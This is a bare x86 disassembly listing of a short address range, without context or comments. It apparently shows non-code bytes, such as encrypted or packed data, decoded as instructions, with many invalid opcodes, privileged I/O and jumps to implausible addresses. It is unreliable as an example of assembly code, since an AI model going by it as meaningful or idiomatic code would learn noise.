  4128fc:	rcr    eax,1
  4128fe:	jns    0x41289b
  412900:	rcr    DWORD PTR [eax+ebx*2],cl
  412903:	add    BYTE PTR [edi],al
  412905:	rcl    esp,0xe
  412908:	sbb    al,BYTE PTR [edi]
  41290a:	mov    edx,0xaec79205
  41290f:	push   ebx
  412910:	aam    0x9a
  412912:	sbb    eax,0x993de16d
  412917:	and    DWORD PTR [esi+0x13a08ffe],eax
  41291d:	pop    ecx
  41291e:	lods   eax,DWORD PTR ds:[esi]
  41291f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412920:	retf   
  412921:	retf   0xa7c1
  412924:	xchg   BYTE PTR [eax-0x34],bl
  412927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412928:	cwde   
  412929:	(bad)  
  41292a:	repz mov edx,ebp
  41292d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41292e:	pop    esp
  41292f:	jnp    0x41293f
  412931:	call   0x804fb58b
  412936:	mov    edx,0x4fe58460
  41293b:	jmp    0x4129b3
  41293d:	loop   0x41292d
  41293f:	xor    DWORD PTR ds:[esi],eax
  412942:	test   al,0xae
  412944:	xlat   BYTE PTR ds:[ebx]
  412945:	and    eax,0xe35e352d
  41294a:	les    eax,FWORD PTR [eax+0x4d]
  41294d:	mov    ebx,0xc8d76569
  412952:	(bad)  
  412954:	xchg   DWORD PTR [ecx+0x3f],esi
  412957:	ds or  bh,al
  41295a:	lods   al,BYTE PTR ds:[esi]
  41295b:	and    dl,al
  41295d:	mov    ebp,0xd0a9a47b
  412962:	pop    edx
  412963:	(bad)  
  412964:	xchg   ebx,eax
  412965:	mov    al,0x6b
  412967:	popf   
  412968:	shl    DWORD PTR ss:[esi],1
  41296b:	popa   
  41296c:	mov    BYTE PTR cs:[ecx-0x5786cc22],0x0
  412974:	shl    edi,0xa7
  412977:	int3   
  412978:	mov    edx,0x3e6a952b
  41297d:	js     0x41294f
  41297f:	test   al,0x31
  412981:	cmp    DWORD PTR [edx-0x18],eax
  412984:	(bad)  
  412985:	jno    0x4129d9
  412987:	in     al,dx
  412988:	jb     0x412a06
  41298a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41298b:	mov    al,ds:0xdfc52183
  412990:	das    
  412991:	(bad)  
  412992:	pop    edi
  412993:	jo     0x4129c3
  412995:	loop   0x41298a
  412997:	clc    
  412998:	pop    edi
  412999:	and    al,0xfc
  41299b:	ror    DWORD PTR [ebx+0x76],1
  41299e:	xchg   BYTE PTR [edi+0x3682b290],dl
  4129a4:	imul   ebp,DWORD PTR [ecx-0x66],0xac40005d
  4129ab:	(bad)  
  4129ac:	cmp    al,bh
  4129ae:	and    ecx,DWORD PTR [ebx]
  4129b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129b1:	fld    QWORD PTR [edx-0x3c]
  4129b4:	adc    esp,DWORD PTR [ecx+0x477720a9]
  4129ba:	loope  0x41293e
  4129bc:	adc    al,0x3
  4129be:	jp     0x412959
  4129c0:	leave  
  4129c1:	mov    eax,0xbf2739a3
  4129c6:	mov    esi,0x317bdd3c
  4129cb:	xchg   ebx,eax
  4129cc:	(bad)  
  4129cd:	mov    al,ds:0x72f1ff6
  4129d2:	adc    edx,DWORD PTR [edi]
  4129d4:	or     BYTE PTR [ebx+edx*1+0x39],dh
  4129d8:	enter  0x5c64,0xd7
  4129dc:	fwait
  4129dd:	dec    edi
  4129de:	mov    cl,0xce
  4129e0:	inc    edi
  4129e1:	fbld   TBYTE PTR ss:[eax]
  4129e4:	push   es
  4129e5:	mov    cl,cl
  4129e7:	sub    eax,esi
  4129e9:	sub    al,0x3
  4129eb:	inc    ecx
  4129ec:	mov    bl,0x2f
  4129ee:	mov    bl,0xd1
  4129f0:	mov    edi,0x907d39f
  4129f5:	cwde   
  4129f6:	lods   eax,DWORD PTR ds:[esi]
  4129f7:	push   esp
  4129f8:	psllq  mm0,mm3
  4129fb:	test   DWORD PTR [ebx-0x67fc7aa4],ebx
  412a01:	addr16 jo 0x4129f3
  412a04:	cmp    DWORD PTR [edx-0x3efb9063],0x4e
  412a0b:	and    eax,0xec9ddd88
  412a10:	adc    ecx,DWORD PTR [ecx+0x60ed5a96]
  412a16:	sbb    al,0x10
  412a18:	and    eax,0xbcc00e76
  412a1d:	daa    
  412a1e:	sbb    al,0x7f
  412a20:	mov    fs,WORD PTR [edx+0x5a]
  412a23:	or     bh,BYTE PTR [edi+0x13]
  412a26:	adc    DWORD PTR [esi-0x66cd08d0],ebx
  412a2c:	pop    es
  412a2d:	xchg   ebx,eax
  412a2e:	test   dh,dl
  412a30:	xchg   edi,eax
  412a31:	gs cli 
  412a33:	dec    ebx
  412a34:	outs   dx,DWORD PTR ds:[esi]
  412a35:	inc    esp
  412a36:	out    dx,al
  412a37:	scas   eax,DWORD PTR es:[edi]
  412a38:	mov    ss,ebp
  412a3a:	or     dl,BYTE PTR [esi-0x2b]
  412a3d:	pop    ds
  412a3e:	loope  0x412a77
  412a40:	mov    bl,BYTE PTR [edx-0x2c]
  412a43:	push   edx
  412a44:	(bad)  
  412a45:	in     al,dx
  412a46:	test   eax,0x9fe55336
  412a4b:	repz es sub dh,al
  412a4f:	push   eax
  412a50:	fld    st(2)
  412a52:	bound  edi,QWORD PTR [edx+0x3d]
  412a55:	push   esp
  412a56:	ins    DWORD PTR es:[edi],dx
  412a57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a58:	adc    cl,0x9f
  412a5b:	outs   dx,DWORD PTR ds:[si]
  412a5d:	out    dx,al
  412a5e:	dec    ebp
  412a5f:	cmp    ecx,DWORD PTR ds:0xe3eb1219
  412a65:	cli    
  412a66:	lods   al,BYTE PTR ds:[esi]
  412a67:	dec    ecx
  412a68:	mov    ebx,0xc742ff7b
  412a6d:	lahf   
  412a6e:	ficomp DWORD PTR [edi+edi*4-0x65]
  412a72:	mov    es,WORD PTR [edx-0x68]
  412a75:	popf   
  412a76:	jb     0x412a37
  412a78:	mov    dh,bl
  412a7a:	push   es
  412a7b:	add    eax,0x48b42c68
  412a80:	sbb    edx,ebx
  412a82:	mov    BYTE PTR [edi+eiz*4+0x6689fb2b],dl
  412a89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a8a:	mov    bh,0x5a
  412a8c:	mov    dl,0xf1
  412a8f:	test   eax,0xb12136fe
  412a94:	lods   al,BYTE PTR ds:[esi]
  412a95:	pop    ss
  412a96:	loopne 0x412b0f
  412a98:	pop    ebp
  412a99:	inc    ebp
  412a9a:	test   bh,ah
  412a9c:	leave  
  412a9d:	push   ds
  412a9e:	add    DWORD PTR [edx-0x648202bc],esi
  412aa4:	inc    esi
  412aa5:	(bad)  
  412aa6:	mov    ah,0x74
  412aa8:	mov    ds:0xd7e057b9,eax
  412aad:	fcmovnbe st,st(5)
  412aaf:	mov    cl,0x62
  412ab1:	xchg   ebx,eax
  412ab2:	dec    BYTE PTR fs:[edx]
  412ab5:	push   cs
  412ab6:	aaa    
  412ab7:	add    al,0x38
  412ab9:	pop    edx
  412aba:	fwait
  412abb:	adc    cl,bl
  412abd:	pop    eax
  412abe:	int3   
  412abf:	inc    ecx
  412ac0:	repnz (bad) 
  412ac2:	push   ebp
  412ac3:	inc    ecx
  412ac4:	push   edx
  412ac5:	xor    esi,esi
  412ac7:	(bad)  
  412ac8:	sub    BYTE PTR [edi+ebp*4+0x17],ah
  412acc:	and    cl,BYTE PTR [edi]
  412ace:	iret   
  412acf:	and    edi,ecx
  412ad1:	stos   DWORD PTR es:[edi],eax
  412ad2:	popa   
  412ad3:	jmp    0xe9eaf4c2
  412ad8:	and    DWORD PTR [ecx],ebx
  412ada:	inc    BYTE PTR [ecx]
  412adc:	push   esi
  412add:	cmp    BYTE PTR [ecx+0x5a54ca58],0xaa
  412ae4:	lahf   
  412ae5:	adc    edx,DWORD PTR [edx-0x32]
  412ae8:	cmp    eax,0xa91388e7
  412aed:	mov    ch,0x4e
  412aef:	pop    edx
  412af0:	xor    al,0x95
  412af2:	rol    DWORD PTR [ebp+eiz*1-0xb],0xf8
  412af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412af8:	mov    edi,0x2b994c90
  412afd:	mov    ebx,DWORD PTR [ecx-0x667994c5]
  412b03:	sub    al,0xbb
  412b05:	(bad)  
  412b06:	fnsave [edx+0x3bab627e]
  412b0c:	in     al,0x30
  412b0e:	pop    ss
  412b0f:	call   0x18e39879
  412b14:	lods   al,BYTE PTR ds:[esi]
  412b15:	bound  ebx,QWORD PTR [edi+0x31464088]
  412b1b:	test   al,0xbc
  412b1d:	inc    ecx
  412b1e:	mov    ?,WORD PTR [ebx+0x4fc4bf4d]
  412b24:	test   BYTE PTR [edi-0x5ec622fc],ch
  412b2a:	mov    dl,BYTE PTR [edx-0x2631dd28]
  412b30:	iret   
  412b31:	in     al,0x69
  412b33:	scas   al,BYTE PTR es:[edi]
  412b34:	pop    ebp
  412b35:	mov    edx,0xf1b1322b
  412b3a:	repnz push ebp
  412b3c:	outs   dx,BYTE PTR ds:[esi]
  412b3d:	jnp    0x412ad6
  412b3f:	pusha  
  412b40:	aad    0xd5
  412b42:	loopne 0x412b95
  412b44:	sub    eax,0xb584bbd5
  412b49:	hlt    
  412b4a:	stc    
  412b4b:	rcr    esp,cl
  412b4d:	push   ebx
  412b4e:	mov    bh,0x99
  412b50:	jae    0x412b04
  412b52:	js     0x412aed
  412b54:	test   eax,0xa994cf23
  412b59:	hlt    
  412b5a:	int    0x1
  412b5c:	sub    esp,DWORD PTR [ebx+eiz*1]
  412b5f:	mov    ds:0xc630f5ce,al
  412b64:	rcl    BYTE PTR [ebp-0x6b],0x67
  412b68:	inc    edi
  412b69:	aas    
  412b6a:	push   ds
  412b6b:	pusha  
  412b6c:	add    edx,ecx
  412b6e:	adc    al,0xc
  412b70:	cwde   
  412b71:	iret   
  412b72:	push   esp
  412b73:	jmp    0xc09e0b54
  412b78:	sbb    ebx,DWORD PTR [ebx-0x72d7b7d4]
  412b7e:	leave  
  412b7f:	adc    BYTE PTR [eax],al
  412b81:	inc    eax
  412b82:	inc    edi
  412b83:	sbb    dl,BYTE PTR [ebp+0xc]
  412b86:	int    0x23
  412b88:	push   ss
  412b89:	shl    DWORD PTR fs:[ecx],0x2
  412b8d:	push   esp
  412b8e:	iret   
  412b8f:	add    ecx,eax
  412b91:	stos   DWORD PTR es:[edi],eax
  412b92:	dec    esi
  412b93:	pop    es
  412b94:	out    0x1f,al
  412b96:	push   ecx
  412b97:	pop    eax
  412b98:	es sbb al,0x58
  412b9b:	jmp    DWORD PTR [ebx+0x5d]
  412b9e:	sbb    ebp,edx
  412ba0:	mov    esp,0x5fd1ca0b
  412ba5:	imul   edx,DWORD PTR [esi],0x7f
  412ba8:	out    0x8c,eax
  412baa:	mov    dh,0x3a
  412bac:	jbe    0x412bd4
  412bae:	jge    0x412ba9
  412bb0:	or     bh,dl
  412bb2:	das    
  412bb3:	leave  
  412bb4:	jmp    0x250c3263
  412bb9:	into   
  412bba:	loop   0x412b49
  412bbc:	scas   al,BYTE PTR es:[edi]
  412bbd:	ja     0x412b90
  412bbf:	call   0xdddf643a
  412bc4:	cs push ss
  412bc6:	cmc    
  412bc7:	xor    DWORD PTR ds:0x16297750,0x9cce0cfe
  412bd1:	je     0x412bd3
  412bd3:	dec    eax
  412bd4:	test   BYTE PTR [ecx-0x43703a75],0x6e
  412bdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bdc:	fs fwait
  412bde:	cwde   
  412bdf:	push   ebp
  412be0:	lds    edx,FWORD PTR [edi+0x692f68cb]
  412be6:	push   ds
  412be7:	sbb    ah,BYTE PTR [edi]
  412be9:	adc    eax,DWORD PTR [eax-0x47]
  412bec:	sub    al,0x29
  412bee:	push   esi
  412bef:	pop    ss
  412bf0:	or     al,0xcc
  412bf2:	jmp    0x412c69
  412bf4:	cmp    al,BYTE PTR [edi+edx*8]
  412bf7:	in     eax,0xf3
  412bf9:	pop    ebp
  412bfa:	jbe    0x412c70
  412bfc:	jge    0x412b88
  412bfe:	pop    ecx
  412bff:	nop
  412c00:	pop    edi
  412c01:	sub    esp,DWORD PTR [eax+0x17]
  412c04:	push   ebp
  412c05:	js     0x412bd2
  412c07:	xchg   esp,eax
  412c08:	mov    ebp,0xa08b5956
  412c0d:	xchg   edi,eax
  412c0e:	mov    bh,0xa6
  412c10:	xor    al,0x93
  412c12:	pop    ds
  412c13:	jnp    0x412c7c
  412c15:	xchg   ebx,eax
  412c16:	adc    ecx,DWORD PTR [ebx+0x37]
  412c19:	stos   DWORD PTR es:[edi],eax
  412c1a:	adc    eax,DWORD PTR [ecx]
  412c1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c1d:	xchg   ebx,eax
  412c1e:	xor    eax,eax
  412c20:	dec    ecx
  412c21:	ds xchg ecx,eax
  412c23:	imul   esi,DWORD PTR [ecx-0x68174082],0x2
  412c2a:	sub    al,BYTE PTR [ecx]
  412c2c:	lods   eax,DWORD PTR ds:[esi]
  412c2d:	rcr    DWORD PTR [eax],1
  412c2f:	imul   eax,DWORD PTR [esi],0x3b
  412c32:	mov    ebx,0xf0b71cd6
  412c37:	adc    eax,0x3b21f0d0
  412c3c:	push   eax
  412c3d:	in     al,0x25
  412c3f:	xor    eax,0xeeb2291a
  412c44:	xlat   BYTE PTR ds:[ebx]
  412c45:	xor    BYTE PTR ds:0xc82f2ed,ah
  412c4b:	jge    0x412be6
  412c4d:	xchg   edi,eax
  412c4e:	pop    edi
  412c4f:	mov    esi,0xf54fc690
  412c54:	ins    DWORD PTR es:[edi],dx
  412c55:	dec    edx
  412c56:	mov    eax,0xb032bb5b
  412c5b:	sbb    DWORD PTR [edx+0x67],esi
  412c5e:	mov    esp,0xea7b3855
  412c63:	or     BYTE PTR [ecx],cl
  412c65:	ret    0xa3d8
  412c68:	push   esp
  412c69:	les    ecx,FWORD PTR [ebx-0x1e]
  412c6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c6d:	jns    0x412c2c
  412c6f:	ret    0x67c8
  412c72:	ficomp DWORD PTR [edi]
  412c74:	fsubr  st,st(5)
  412c76:	sub    al,0x1b
  412c78:	dec    esp
  412c79:	hlt    
  412c7a:	sar    dl,cl
  412c7c:	cmp    BYTE PTR [edx-0x31],al
  412c7f:	into   
  412c80:	mov    ah,0x9e
  412c82:	jae    0x412c4f
  412c84:	stc    
  412c85:	popa   
  412c86:	jmp    0xd51b:0x3159e2c2
  412c8d:	pop    ebp
  412c8e:	jle    0x412ca1
  412c90:	stos   DWORD PTR es:[edi],eax
  412c91:	int3   
  412c92:	pushf  
  412c93:	dec    ecx
  412c94:	cmp    al,0x4d
  412c96:	cwde   
  412c97:	and    BYTE PTR [eax+0x6d65a9ca],al
  412c9d:	out    0x86,al
  412c9f:	pop    esi
  412ca0:	sbb    eax,0x6adf7bdf
  412ca5:	(bad)  
  412ca6:	mov    al,ds:0xa7396998
  412cab:	add    al,0xe4
  412cad:	pop    es
  412cae:	inc    edi
  412caf:	add    esi,ecx
  412cb1:	jno    0x412cc8
  412cb3:	scas   eax,DWORD PTR es:[edi]
  412cb4:	fstp   TBYTE PTR [edi]
  412cb6:	dec    esp
  412cb7:	sub    BYTE PTR [eax-0xcf4ba79],bl
  412cbd:	xor    al,0xb5
  412cbf:	dec    ecx
  412cc0:	(bad)  
  412cc1:	outs   dx,DWORD PTR ds:[esi]
  412cc2:	lock sbb al,0x17
  412cc5:	leave  
  412cc6:	lock jne 0x412c6f
  412cc9:	xor    BYTE PTR ds:0x21bc6638,0x49
  412cd0:	icebp  
  412cd1:	add    al,0x21
  412cd3:	mov    ebx,0x7d1ed1fa
  412cd8:	and    al,BYTE PTR [ecx-0xf]
  412cdb:	call   0x88d89ef4
  412ce0:	adc    BYTE PTR [edx+0x7bac47c0],0x1e
  412ce7:	out    0xa9,eax
  412ce9:	adc    esp,DWORD PTR [esi+0x6b]
  412cec:	mov    edi,0xd6ccd815
  412cf1:	ret    0x5d9d
  412cf4:	jo     0x412c82
  412cf6:	fcmovnb st,st(7)
  412cf8:	stc    
  412cf9:	je     0x412c97
  412cfb:	gs mov dl,0x13
  412cfe:	clc    
  412cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d00:	xor    al,0x6a
  412d02:	inc    edx
  412d03:	jmp    0x476e52d6
  412d08:	add    al,0x1
  412d0a:	es jle 0x412d57
  412d0d:	inc    esp
  412d0e:	mov    bh,0xac
  412d10:	jb     0x412d04
  412d12:	cmp    BYTE PTR [ebp-0x6d0f6eae],dh
  412d18:	pop    ebp
  412d19:	mov    esp,0x945d5a8f
  412d1e:	cwde   
  412d1f:	dec    edi
  412d20:	retf   
  412d21:	jmp    0xe9c75af8
  412d26:	repz sbb eax,0xcdd6ff73
  412d2c:	dec    edi
  412d2d:	ins    BYTE PTR es:[edi],dx
  412d2e:	arpl   WORD PTR [eax+edi*4],di
  412d31:	adc    al,0x37
  412d33:	cmp    al,0x8a
  412d35:	push   esp
  412d36:	add    eax,0xf647b8fa
  412d3b:	pop    ebx
  412d3c:	pop    ds
  412d3d:	and    eax,0x8da7cce8
  412d42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d43:	test   al,dl
  412d45:	ins    BYTE PTR es:[edi],dx
  412d46:	ror    DWORD PTR [edi-0x3],1
  412d49:	cmp    dl,cl
  412d4b:	mov    ebp,eax
  412d4d:	mov    ah,0xb3
  412d4f:	call   0x278c91d0
  412d54:	mov    fs:0x38865950,al
  412d5a:	pop    ecx
  412d5b:	(bad)  
  412d5c:	mov    ebx,0xbfcbf0d3
  412d61:	out    0x75,eax
  412d63:	sbb    ebp,edi
  412d65:	js     0x412d7d
  412d67:	dec    esp
  412d68:	(bad)  
  412d69:	in     eax,0x14
  412d6b:	xchg   esp,eax
  412d6c:	imul   ecx,edi,0x4e
  412d6f:	aam    0xff
  412d71:	xor    edi,ebx
  412d73:	pushf  
  412d74:	out    0xe3,al
  412d76:	add    eax,0xfca41e32
  412d7b:	mov    al,0xa8
  412d7d:	out    0x8f,al
  412d7f:	jecxz  0x412d72
  412d81:	inc    ebp
  412d82:	sub    DWORD PTR [ecx],0xffffffad
  412d85:	stc    
  412d86:	dec    ebp
  412d87:	int    0x3d
  412d89:	rcl    DWORD PTR [eax+ebx*1+0x3b],1
  412d8d:	inc    ebp
  412d8e:	mov    al,0x97
  412d90:	jge    0x412d2c
  412d92:	add    eax,0xc6dcfc9e
  412d97:	push   cs
  412d98:	mov    ebx,0xa29c10ce
  412d9d:	and    al,0xbe
  412d9f:	in     al,dx
  412da0:	jmp    0xbe63552d
  412da5:	outs   dx,BYTE PTR ds:[esi]
  412da6:	int3   
  412da7:	add    al,0x12
  412da9:	jno    0x412d58
  412dab:	cmp    eax,DWORD PTR [esi+0xa758dcd]
  412db1:	lock outs dx,BYTE PTR ds:[esi]
  412db3:	jmp    0x2bb066cf
  412db8:	dec    edi
  412db9:	xor    ebp,DWORD PTR [ecx+0x1f67e3e5]
  412dbf:	neg    DWORD PTR [eax]
  412dc1:	aam    0x8e
  412dc3:	ror    DWORD PTR cs:[ecx],cl
  412dc6:	add    bl,dl
  412dc8:	(bad)  
  412dc9:	cmp    BYTE PTR [eax],dl
  412dcb:	mov    eax,ecx
  412dcd:	test   ch,bl
  412dcf:	add    edx,ebp
  412dd1:	sti    
  412dd2:	pop    edx
  412dd3:	out    dx,eax
  412dd4:	stos   BYTE PTR es:[edi],al
  412dd5:	das    
  412dd6:	mov    ch,0x93
  412dd8:	dec    edx
  412dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dda:	cmp    eax,0x9cb83d9f
  412ddf:	retf   
  412de0:	jnp    0x412def
  412de2:	out    dx,eax
  412de3:	iret   
  412de4:	and    BYTE PTR [ecx-0x7aafbb8d],ah
  412dea:	xchg   esi,eax
  412deb:	push   ecx
  412dec:	js     0x412dba
  412dee:	fdivr  DWORD PTR [ebp-0x5207d127]
  412df4:	jo     0x412e04
  412df6:	fwait
  412df7:	or     DWORD PTR [edx],ebp
  412df9:	icebp  
  412dfa:	test   dl,dl
  412dfc:	cli    
  412dfd:	and    cl,ah
  412dff:	ret    0x3b6e
  412e02:	jmp    0x42d243db
  412e07:	call   0x4b81:0x644abc9e
  412e0e:	or     bh,BYTE PTR [edi-0x64]
  412e11:	and    cl,BYTE PTR [edi]
  412e13:	sbb    BYTE PTR [edi-0x21],0xe3
  412e17:	enter  0x69f9,0x1e
  412e1b:	daa    
  412e1c:	int    0x3c
  412e1e:	mov    eax,ds:0xcad6ad21
  412e23:	shl    BYTE PTR [ecx],0x88
  412e26:	cmp    bl,BYTE PTR fs:[ebx-0x261491bd]
  412e2d:	sbb    BYTE PTR [edi+0x482dc0c],bh
  412e33:	mov    ds,esp
  412e35:	es ret 
  412e37:	repz mov al,0x96
  412e3a:	mov    BYTE PTR [esi],ch
  412e3c:	mov    ah,0x7
  412e3e:	fidivr DWORD PTR [esi]
  412e40:	sbb    cl,ch
  412e42:	cmp    ebp,DWORD PTR es:[ebx+0x21]
  412e46:	mov    WORD PTR [edi+0x4e],cs
  412e49:	test   BYTE PTR [ebx-0x5aa9329d],bh
  412e4f:	add    DWORD PTR [edi+0x1d],edx
  412e52:	mov    dh,0x90
  412e54:	jne    0x412e89
  412e56:	frstor [ecx-0x1f]
  412e59:	adc    ebp,edx
  412e5b:	fwait
  412e5c:	add    bh,dh
  412e5e:	sbb    bh,al
  412e60:	in     al,0x9d
  412e62:	adc    bh,bh
  412e64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e65:	stc    
  412e66:	movntq (bad),mm6
  412e67:	out    0xf0,eax
  412e69:	jg     0x412eb4
  412e6b:	jnp    0x412e49
  412e6d:	retf   0xeeb
  412e70:	loopne 0x412e72
  412e72:	in     al,dx
  412e73:	mov    ds:0x530a8fdb,al
  412e78:	dec    ecx
  412e79:	mov    cl,0xae
  412e7b:	jmp    0xec70:0x9a98146b
  412e82:	(bad)  
  412e83:	enter  0xd588,0xff
  412e87:	clc    
  412e88:	lds    edi,FWORD PTR [eax+0x25b35bb3]
  412e8e:	mov    ecx,0x25639d50
  412e93:	jnp    0x412e6f
  412e95:	out    0x1,al
  412e97:	mov    esp,0x97dff5f1
  412e9c:	xchg   edx,eax
  412e9d:	sar    BYTE PTR [ebp+0x1898500a],0xb1
  412ea4:	jo     0x412e81
  412ea6:	(bad)  
  412ea8:	inc    BYTE PTR [edx*8+0x73ac2544]
  412eaf:	sbb    DWORD PTR [esi],edx
  412eb1:	test   eax,0x6f05c2d2
  412eb6:	pop    esp
  412eb7:	add    eax,0x9559cc54
  412ebc:	adc    BYTE PTR [eax+0x75124ace],bh
  412ec2:	sbb    dl,BYTE PTR [edx-0x54]
  412ec5:	add    DWORD PTR [ecx],0xa88a31e4
  412ecb:	rcl    BYTE PTR [esi+0x1e],cl
  412ece:	sbb    edi,DWORD PTR [eax-0xd60b9d9]
  412ed4:	or     BYTE PTR [ecx],0x97
  412ed7:	xor    al,0xfe
  412ed9:	jne    0x412ed4
  412edb:	jo     0x412f10
  412edd:	inc    ebx
  412ede:	mov    bl,0x47
  412ee0:	mov    ebp,0xf6a98fa3
  412ee5:	sbb    dl,BYTE PTR [edx+ebp*2+0x525d1c6e]
  412eec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eed:	mov    esp,0x8280d564
  412ef2:	jae    0x412f3a
  412ef4:	mov    bl,0x34
  412ef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ef7:	shl    BYTE PTR [eax+edi*1-0x49],0x9
  412efc:	scas   al,BYTE PTR es:[edi]
  412efd:	or     BYTE PTR [esi-0x63],bh
  412f00:	or     esi,edx
  412f02:	push   ebx
  412f03:	or     al,0x2b
  412f05:	imul   eax,edi,0x2a
  412f08:	pop    esi
  412f09:	mov    ebx,0xfa190df4
  412f0e:	cmp    dl,ch
  412f10:	and    DWORD PTR [eax],edi
  412f12:	xlat   BYTE PTR ds:[ebx]
  412f13:	mov    al,ds:0x8d6a7c23
  412f18:	jno    0x412f61
  412f1a:	dec    esp
  412f1b:	je     0x412f0a
  412f1d:	adc    esi,DWORD PTR [esp+eax*4-0x4b]
  412f21:	dec    ecx
  412f22:	je     0x412f9f
  412f24:	sahf   
  412f25:	bound  esp,QWORD PTR [eiz*4+0x78951682]
  412f2c:	das    
  412f2d:	jg     0x412f4d
  412f2f:	cmp    eax,0xa0b0c916
  412f34:	int3   
  412f35:	ret    
  412f36:	rol    DWORD PTR [edx],0x32
  412f39:	adc    al,0x81
  412f3b:	xchg   ebp,eax
  412f3c:	stos   DWORD PTR es:[edi],eax
  412f3d:	and    al,0x7d
  412f3f:	mov    dl,0xff
  412f41:	test   ebx,ebp
  412f43:	sbb    BYTE PTR [ebx-0x6f337de7],ah
  412f49:	mov    cl,0x76
  412f4b:	mulps  xmm4,XMMWORD PTR [esi-0x46]
  412f4f:	imul   ebp,DWORD PTR [eax+0x61d32aea],0x5018f4d7
  412f59:	fdivr  QWORD PTR [edi-0x4f]
  412f5c:	in     eax,0x27
  412f5e:	test   DWORD PTR [edi+0x7f33e243],ebp
  412f64:	mov    bl,0x64
  412f66:	and    eax,0xa1a26410
  412f6b:	pop    eax
  412f6c:	pop    ecx
  412f6d:	pop    ecx
  412f6e:	pop    ss
  412f6f:	in     al,0x82
  412f71:	and    ch,bh
  412f73:	dec    ebp
  412f74:	pop    ds
  412f75:	(bad)  
  412f76:	cmp    DWORD PTR [edi-0x3010d2f6],esp
  412f7c:	ds dec ebx
  412f7e:	mov    dh,0xa0
  412f80:	xchg   edx,eax
  412f81:	fmul   QWORD PTR [edi]
  412f83:	clc    
  412f84:	mov    WORD PTR [edx+0x6f],fs
  412f87:	sbb    al,0xdc
  412f89:	(bad)  
  412f8a:	aaa    
  412f8b:	imul   edi,DWORD PTR [esi+esi*1],0x65
  412f8f:	push   ss
  412f90:	leave  
  412f91:	imul   BYTE PTR [ebx]
  412f93:	pop    es
  412f94:	mov    DWORD PTR [eax+0x704ab8ab],ecx
  412f9a:	mov    BYTE PTR [ecx-0x134dc6ab],ah
  412fa0:	push   0x526ac414
  412fa5:	push   0xb4ec9994
  412faa:	out    dx,eax
  412fab:	call   0x9cd1b8ab
  412fb0:	aam    0x51
  412fb2:	enter  0xdd05,0x64
  412fb6:	sub    bh,ch
  412fb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fb9:	and    eax,0x5f9f9eb3
  412fbe:	mov    ds:0xfb7da327,al
  412fc3:	cmp    eax,0xe7d5b50
  412fc8:	sbb    DWORD PTR [ebx],ebx
  412fca:	enter  0x900e,0x31
  412fce:	mov    edi,0x20d0447b
  412fd3:	jle    0x41300e
  412fd5:	pop    es
  412fd6:	mov    ah,0x15
  412fd8:	int3   
  412fd9:	add    BYTE PTR [edi],bh
  412fdb:	pusha  
  412fdc:	fdivr  st(3),st
  412fde:	test   eax,0x9b116d3b
  412fe3:	xchg   edx,eax
  412fe4:	xor    cl,dh
  412fe6:	xchg   ebx,eax
  412fe7:	jbe    0x41305e
  412fe9:	iret   
  412fea:	xchg   esp,eax
  412feb:	xchg   edx,eax
  412fec:	loop   0x413048
  412fee:	out    0xfe,al
  412ff0:	sbb    eax,0xa3d46b18
  412ff5:	sub    BYTE PTR [ebp-0x12178ece],bh
  412ffb:	mov    al,ds:0xa238111b
  413000:	std    
  413001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413002:	mov    ch,0x2a
  413004:	pop    ecx
  413005:	aaa    
  413006:	push   edx
  413007:	into   
  413008:	test   DWORD PTR [esi-0x34974314],ecx
  41300e:	push   ecx
  41300f:	aad    0xc7
  413011:	fidiv  WORD PTR [eax-0x30c940ac]
  413017:	leave  
  413018:	call   0x840acbe4
  41301d:	imul   edi,DWORD PTR [ebp-0x52],0x59
  413021:	les    eax,FWORD PTR [eax]
  413023:	jg     0x41306d
  413025:	leave  
  413026:	dec    ebp
  413027:	mov    ebp,0xc89a066d
  41302c:	fst    QWORD PTR [ecx+edi*1+0x70]
  413030:	mov    al,0xd
  413032:	scas   al,BYTE PTR es:[edi]
  413033:	fcmovbe st,st(7)
  413035:	dec    ebx
  413036:	stos   BYTE PTR es:[edi],al
  413037:	lock jo 0x413075
  41303a:	xor    al,0xf8
  41303c:	mov    edx,0xb420247e
  413041:	(bad)  
  413042:	mov    ebp,0x402193fe
  413047:	jne    0x413033
  413049:	iret   
  41304a:	mov    al,ds:0x9a4d7cc1
  41304f:	inc    ebp
  413050:	inc    edi
  413051:	sub    al,0x7e
  413053:	scas   al,BYTE PTR es:[edi]
  413054:	jo     0x413043
  413056:	mov    ch,0xb3
  413058:	fisub  DWORD PTR [eax-0x7d]
  41305b:	jae    0x4130d6
  41305d:	arpl   dx,sp
  41305f:	sbb    BYTE PTR [edx+edx*8+0x5f7ed400],0xa9
  413067:	xchg   esp,eax
  413068:	cmp    bh,dh
  41306a:	xlat   BYTE PTR ds:[ebx]
  41306b:	loopne 0x413026
  41306d:	pop    eax
  41306e:	pop    ebp
  41306f:	out    dx,al
  413070:	cli    
  413071:	clc    
  413072:	push   cs
  413073:	stos   BYTE PTR es:[edi],al
  413074:	icebp  
  413075:	and    ecx,eax
  413077:	popf   
  413078:	jp     0x4130a9
  41307a:	xchg   esp,eax
  41307b:	imul   edi,DWORD PTR ds:0x1ce59841,0xa9589a31
  413085:	data16 jg 0x41306f
  413088:	nop
  413089:	popf   
  41308a:	or     eax,0xd566f57a
  41308f:	push   0x3767fb23
  413094:	pop    ss
